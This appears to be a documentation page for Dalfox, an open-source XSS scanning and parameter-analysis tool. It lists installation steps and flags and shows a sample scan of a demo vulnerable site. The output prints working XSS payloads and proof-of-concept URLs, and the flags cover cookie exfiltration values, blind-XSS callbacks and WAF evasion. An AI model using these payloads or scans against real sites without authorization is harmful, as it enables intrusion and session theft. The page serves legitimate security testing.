---
title : "Dalfox"
# pre : ' '
description : "XSS Scanning and Parameter Analysis tool."
date : 2020-05-12T12:28:52+02:00
# hidden : true
# draft : true
weight : 0
tags : ['Oth420r','XSS']
---

---

DalFox is an powerful open source XSS scanning tool and parameter analyzer and utility that fast the process of detecting and verify XSS flaws. It comes with a powerful testing engine, many niche features for the cool hacker

I talk about naming. Dal([달](https://en.wiktionary.org/wiki/%EB%8B%AC)) is the Korean pronunciation of moon, and Fox are made to mean "Finder Of XSS" or 🦊

## Installation

```plain
git clone https://github.com/hahwul/dalfox
go install
~/go/bin/dalfox
```

## Usage

```plain
dalfox [flags]
dalfox [command]
```

## Flags

```plain
Available Commands:
  completion  Generate the autocompletion script for the specified shell
  file        Use file mode(targets list or rawdata)
  help        Help about any command
  payload     Payload mode, make and enum payloads
  pipe        Use pipeline mode
  server      Start API Server
  sxss        Use Stored XSS mode
  url         Use single target mode
  version     Show version

Flags:
  -b, --blind string                Add your blind xss
                                      * Example: -b hahwul.xss.ht
      --config string               Using config from file
  -C, --cookie string               Add custom cookie
      --cookie-from-raw string      Load cookie from burp raw http request
                                      * Example: --cookie-from-raw request.txt
      --custom-alert-type string    Change alert value type
                                      * Example: --custom-alert-type=none / --custom-alert-type=str,none (default "none")
      --custom-alert-value string   Change alert value
                                      * Example: --custom-alert-value=document.cookie (default "1")
      --custom-payload string       Add custom payloads from file
  -d, --data string                 Using POST Method and add Body data
      --debug                       debug mode, save all log using -o option
      --deep-domxss                 DOM XSS Testing with more payloads on headless [so slow]
      --delay int                   Milliseconds between send to same host (1000==1s)
  -F, --follow-redirects            Following redirection
      --format string               Stdout output format
                                      * Supported: plain / json (default "plain")
      --found-action string         If found weak/vuln, action(cmd) to next
                                      * Example: --found-action='./notify.sh'
      --found-action-shell string   Select shell application for --found-action (default "bash")
      --grep string                 Using custom grepping file
                                      * Example: --grep ./samples/sample_grep.json
  -H, --header strings              Add custom headers
  -h, --help                        help for dalfox
      --ignore-return string        Ignore scanning from return code
                                      * Example: --ignore-return 302,403,404
  -X, --method string               Force overriding HTTP Method
                                      * Example: -X PUT (default "GET")
      --mining-dict                 Find new parameter with dictionary attack, default is Gf-Patterns=>XSS (default true)
  -W, --mining-dict-word string     Custom wordlist file for param mining
                                      * Example: --mining-dict-word word.txt
      --mining-dom                  Find new parameter in DOM (attribute/js value) (default true)
      --no-color                    Not use colorize
      --no-spinner                  Not use spinner
      --only-custom-payload         Only testing custom payload (required --custom-payload)
      --only-discovery              Only testing parameter analysis (same '--skip-xss-scanning' option)
      --only-poc string             Shows only the PoC code for the specified pattern (g: grep / r: reflected / v: verified)
                                     * Example: --only-poc='g,v'
  -o, --output string               Write to output file (By default, only the PoC code is saved)
      --output-all                  All log write mode (-o or stdout)
  -p, --param strings               Only testing selected parameters
      --poc-type string             Select PoC type 
                                     * Supported: plain/curl/httpie/http-request
                                     * Example: --poc-type='curl' (default "plain")
      --proxy string                Send all request to proxy server
                                      * Example: --proxy http://127.0.0.1:8080
      --remote-payloads string      Using remote payload for XSS testing
                                      * Supported: portswigger/payloadbox
                                      * Example: --remote-payloads=portswigger,payloadbox
      --remote-wordlists string     Using remote wordlists for param mining
                                      * Supported: burp/assetnote
                                      * Example: --remote-wordlists=burp
  -S, --silence                     Only print PoC Code and Progress(for pipe/file mode)
      --skip-bav                    Skipping BAV(Basic Another Vulnerability) analysis
      --skip-grepping               Skipping built-in grepping
      --skip-headless               Skipping headless browser base scanning[DOM XSS and inJS verify]
      --skip-mining-all             Skipping ALL parameter mining
      --skip-mining-dict            Skipping Dict base parameter mining
      --skip-mining-dom             Skipping DOM base parameter mining
      --skip-xss-scanning           Skipping XSS Scanning (same '--only-discovery' option)
      --timeout int                 Second of timeout (default 10)
      --user-agent string           Add custom UserAgent
      --waf-evasion                 Avoid blocking by adjusting the speed when detecting WAF (worker=1 delay=3s)
  -w, --worker int                  Number of worker (default 100)

Use "dalfox [command] --help" for more information about a command.
```

## Examples

```plain
$ dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff

    _..._
  .' .::::.   __   _   _    ___ _ __ __
 :  :::::::: |  \ / \ | |  | __/ \\ V /
 :  :::::::: | o ) o || |_ | _( o )) (  
 '. '::::::' |__/|_n_||___||_| \_//_n_\
   '-.::''

Parameter Analysis and XSS Scanning tool based on golang
Finder Of XSS and Dal is the Korean pronunciation of moon. @hahwul
[*] Using single target mode
[*] Target URL: http://testphp.vulnweb.com/listproducts.php?cat=123&artist=123&asdf=ff
[*] Vaild target [ code:200 / size:4699 ]
[*] Start parameter analysis.. 🔍
[*] Start static analysis.. 🔍
[I] Content-Type is text/html
[I] Reflected cat param => inHTML[1]   $
    48 line:    Error: Unknown column '123DalFox' in 'where cl
[*] Generate XSS payload and optimization.Optimization.. 🛠
[*] Start XSS Scanning.. with 230 queries 🗡
[W] Reflected Payload in HTML: cat="><script/"<a"/src=data:=".<a,[45].some(confirm)>
    48 line:  syntax to use near '"><script/"<a"/src=data:=".<a,[45].some(confirm)>' at line 1
    +> http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Cscript%2F%22%3Ca%22%2Fsrc%3Ddata%3A%3D%22.%3Ca%2C%5B45%5D.some%28confirm%29%3E
[V] Triggered XSS Payload (found DOM Object): cat="><svg/OnLoad="`${prompt``}`" class=dalfox>
    48 line:  syntax to use near '"><svg/OnLoad="`${prompt``}`" class=dalfox>' at line 1
    +> http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2FOnLoad%3D%22%60%24%7Bprompt%60%60%7D%60%22+class%3Ddalfox%3E
[*] Finish :D
```

## URL List

- [GitHub.com - dalfox](https://github.com/hahwul/dalfox)
